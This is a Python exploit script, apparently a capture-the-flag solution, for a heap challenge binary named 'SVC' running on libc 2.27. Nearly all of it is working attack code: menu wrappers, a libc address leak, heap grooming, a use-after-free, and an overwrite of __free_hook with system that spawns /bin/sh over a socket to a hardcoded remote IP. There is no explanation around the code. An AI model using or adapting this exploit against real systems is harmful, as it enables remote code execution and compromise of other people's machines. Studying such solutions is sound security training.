from ptrlib import *

STRING, STRINGVIEW, CHAR, LOCAL = 1, 2, 3, 4

class String:
    @staticmethod
    def New(data):
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("Input Data > ", data)
    @staticmethod
    def Delete():
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("> ", "2")
    @staticmethod
    def Edit(data):
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("Input Edit Data > ", data)
    @staticmethod
    def View():
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("> ", "4")
        return sock.recvline()

class StringView:
    @staticmethod
    def New(type):
        if type == CHAR: type = 2
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("> ", str(type))
    @staticmethod
    def Delete():
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("> ", "2")
    @staticmethod
    def Edit(type):
        if type == CHAR: type = 2
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", str(type))
    @staticmethod
    def View():
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("> ", "4")
        return sock.recvline()

class Char:
    @staticmethod
    def New(data):
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", "1")
        sock.sendafter("Input Data > ", data)
    @staticmethod
    def Delete():
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", "2")
    @staticmethod
    def Edit(data):
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", "3")
        sock.sendafter("Input Edit Data > ", data)
    @staticmethod
    def View():
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", "4")
        return sock.recvline()

class Builtin(object):
    def __init__(self, type):
        sock.sendlineafter("> ", "4")
        sock.sendlineafter("> ", str(type))
        self.t = type
    def __del__(self):
        if self.t == STRINGVIEW:
            sock.sendlineafter("> ", "6")
        else:
            sock.sendlineafter("> ", "5")
        sock.sendlineafter("> ", "4")

    def Copy(self, data=None, type=None, size=0, offset=0):
        sock.sendlineafter("> ", "1") # Copy
        if self.t == STRINGVIEW:
            if type == CHAR: type = 2
            elif type == LOCAL: type = 3
            sock.sendlineafter("Type > ", str(type))
            sock.sendlineafter("Input Size > ", str(size))
            sock.sendlineafter("Input Offset > ", str(offset))
        else:
            sock.sendlineafter("Input Copy Data > ", data)

    def At(self, index):
        sock.sendlineafter("> ", "2") # At
        sock.sendlineafter("Input At IDX > ", str(index))
        return sock.recvlineafter("> ")

    def Concat(self, type, data=None, type2=None, data2=None):
        sock.sendlineafter("> ", "3") # Concat
        if self.t == STRINGVIEW:
            if type == CHAR: type = 2
            elif type == LOCAL: type = 3
            sock.sendlineafter("Type > ", str(type))
            if type == 3:
                sock.sendlineafter("Arg0 > ", data)
            
            if type2 == CHAR: type2 = 2
            elif type2 == LOCAL: type2 = 3
            sock.sendlineafter("Type > ", str(type2))
            if type2 == 3:
                sock.sendlineafter("Arg 1 > ", data2)
        else:
            sock.sendlineafter("Type > ", str(type))
            if type == LOCAL:
                sock.sendlineafter("> ", data)

    def Swap(self, type, data=None):
        sock.sendlineafter("> ", "4") # Swap
        sock.sendlineafter("Type > ", str(type))
        if type == LOCAL:
            sock.sendlineafter("> ", data)
        return sock.recvlineafter("> ")

    def Write(self, type, data=None):
        assert self.t == STRINGVIEW
        sock.sendlineafter("> ", "5") # Write
        if type == CHAR: type = 2
        elif type == LOCAL: type = 3
        sock.sendlineafter("Type > ", str(type))
        if type == 3:
            sock.sendlineafter("> ", data)

libc = ELF("./libc-2.27.so")
#sock = Process("./san-SVC")
#sock = Process("./dbg-SVC")
#sock = Socket("localhost", 9999)
sock = Socket("nc 39.115.110.8 9999")

# Leak libc address
String().New("A"*0x8)
Builtin(STRING).Concat(LOCAL, "A"*0x280)
Builtin(STRING).Concat(LOCAL, "A"*0x280)
Builtin(STRING).Concat(LOCAL, "A"*0x200)
Char().New("\x60")
libc_base = u64(Char().View()) - libc.main_arena() - 0x620
libc.set_base(libc_base)
Char().Delete()
String.Delete()

# Feng shui
Char().New("B"*0x20)
String().New("C"*0x18)
Builtin(STRING).Swap(LOCAL, "D"*0x18)
Char().Delete()

# UAF
Char().New("A"*0x40)
String().Delete()
String().New("X"*0x40)
Builtin(STRING).Swap(type=LOCAL, data="Y"*0x40)
Char().Delete()
StringView().New(STRING)
String().Delete()
String().New("X"*0x10)
Builtin(STRINGVIEW).Concat(type=STRING, type2=LOCAL, data2="Q"*0x30)

# overwrite
Builtin(STRINGVIEW).Write(LOCAL, p64(libc.symbol("__free_hook") - 0x38))
Char().New("A"*0x40)
x = Builtin(STRINGVIEW)
x.Concat(type=LOCAL,
         data=b'/bin/sh;',
         type2=LOCAL,
         data2=b"B"*0x30 + p64(libc.symbol("system")))

sock.interactive()
